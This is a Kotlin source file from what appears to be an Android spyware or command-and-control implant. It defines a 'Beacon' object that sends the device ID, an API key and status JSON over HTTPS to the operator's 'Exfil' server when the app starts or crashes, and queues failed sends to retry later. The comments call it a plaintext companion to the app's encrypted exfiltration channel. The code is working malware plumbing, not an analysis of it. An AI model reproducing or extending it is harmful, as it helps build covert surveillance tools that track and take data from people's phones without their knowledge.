package com.sp.core.util

import android.content.Context
import android.util.Log
import com.sp.core.c2.Exfil
import okhttp3.FormBody
import okhttp3.OkHttpClient
import okhttp3.Request
import java.io.File
import java.util.concurrent.TimeUnit

/**
 * Plaintext beacon.
 *
 * The regular exfiltration channel is encrypted and buffered, so a device that
 * dies during startup leaves no trace on the dashboard. The beacon is a tiny
 * plain HTTPS POST that is sent the moment the process starts (and when it
 * crashes), which makes "is the app alive / what killed it" answerable from
 * the dashboard without touching the phone.
 */
object Beacon {

    private const val TAG = "Beacon"
    private const val PENDING = "beacon_pending.log"

    private val client = OkHttpClient.Builder()
        .connectTimeout(8, TimeUnit.SECONDS)
        .readTimeout(8, TimeUnit.SECONDS)
        .writeTimeout(8, TimeUnit.SECONDS)
        .build()

    /** Fire-and-forget beacon (never throws, never blocks the caller). */
    fun send(ctx: Context, kind: String, json: String) {
        val app = ctx.applicationContext
        Thread {
            try {
                val ok = post(app, kind, json)
                if (!ok) appendPending(app, kind, json)
            } catch (t: Throwable) {
                Log.w(TAG, "beacon failed: ${t.message}")
            }
        }.start()
    }

    /**
     * Blocking beacon with a hard timeout - used from the crash handler,
     * where the process is about to die.
     */
    fun sendSync(ctx: Context, kind: String, json: String, timeoutMs: Long = 3000) {
        val app = ctx.applicationContext
        val t = Thread { try { post(app, kind, json) } catch (_: Throwable) {} }
        t.isDaemon = true
        t.start()
        try { t.join(timeoutMs) } catch (_: Throwable) {}
    }

    /** Sends whatever could not be delivered during a previous (dead) run. */
    fun flushPending(ctx: Context) {
        val app = ctx.applicationContext
        Thread {
            try {
                val f = File(app.filesDir, PENDING)
                if (!f.exists() || f.length() == 0L) return@Thread
                val text = f.readText()
                f.delete()
                text.lineSequence().filter { it.isNotBlank() }.forEach { line ->
                    val sep = line.indexOf('|')
                    if (sep <= 0) return@forEach
                    val kind = line.substring(0, sep)
                    val json = line.substring(sep + 1)
                    if (!post(app, kind, json)) {
                        appendPending(app, kind, json)
                        return@forEach
                    }
                }
            } catch (_: Throwable) {
            }
        }.start()
    }

    private fun appendPending(ctx: Context, kind: String, json: String) {
        try {
            val f = File(ctx.filesDir, PENDING)
            f.appendText("$kind|$json\n")
            if (f.length() > 256 * 1024) f.delete()
        } catch (_: Throwable) {
        }
    }

    private fun post(ctx: Context, kind: String, json: String): Boolean {
        val base = Exfil.baseUrl(ctx) ?: return false
        val key = Exfil.apiKeyValue() ?: ""
        val body = FormBody.Builder()
            .add("d", json)
            .add("k", key)
            .add("kind", kind)
            .add("dev", Prefs.deviceId(ctx))
            .build()
        val req = Request.Builder().url("$base/beacon").post(body).build()
        client.newCall(req).execute().use { resp -> return resp.isSuccessful }
    }
}
